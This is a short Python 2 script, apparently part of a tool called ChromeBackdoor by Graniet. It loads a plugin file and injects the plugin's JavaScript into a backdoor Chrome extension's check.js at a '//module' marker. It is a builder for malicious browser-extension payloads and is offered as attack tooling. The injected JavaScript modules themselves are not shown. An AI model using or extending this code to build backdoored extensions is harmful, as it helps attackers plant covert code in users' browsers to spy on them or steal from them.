#!usr/bin/env python

# Graniet - ChromeBackdoor Module

import urllib2
import time
import sys
import os

class bcolors:
    
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def start(backdoor, Content):
    try:
        reading = open(backdoor + "/js/check.js").read()
        if "//module" in reading:
            code = reading.replace("//module", "//module \n" + Content + "\n")
            OpenCall = open(backdoor + "/js/check.js","w")
            OpenCall.write(code)
        else:
            print "[" + bcolors.OKBLUE + "x" + bcolors.ENDC + "] " + "Module point not found."
        
    except:
        print "[" + bcolors.OKBLUE + "x" + bcolors.ENDC + "] " + "Open error." 
    
def main():
    if(len(sys.argv) > 2):
        backdoor = sys.argv[2]
        module = sys.argv[1]
        if(os.path.isdir("../../modules/plugins/" + module) == True):
            if(os.path.isdir(backdoor) == True):
                try:
                    LoadModule = open('../../modules/plugins/' + module + "/" + module + ".chromebackdoor").read()
                    LoadModule = LoadModule.strip()
                    
                    Title = LoadModule.split('%title%')[1]
                    Content = LoadModule.split('%content%')[1]
                    
                    print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] " + "Generate module : " + Title
                    start(backdoor, Content)
                except:
                    print "[" + bcolors.OKBLUE + "x" + bcolors.ENDC + "] " + "Load module failed"
            else:
                print "[" + bcolors.OKBLUE + "x" + bcolors.ENDC + "] " + "Backdoor not found"
        else:
            print "[" + bcolors.OKBLUE + "x" + bcolors.ENDC + "] " + "Module not found"
    else:
        print "Usage: " + sys.argv[0] + " modulename backdoorpath"

main()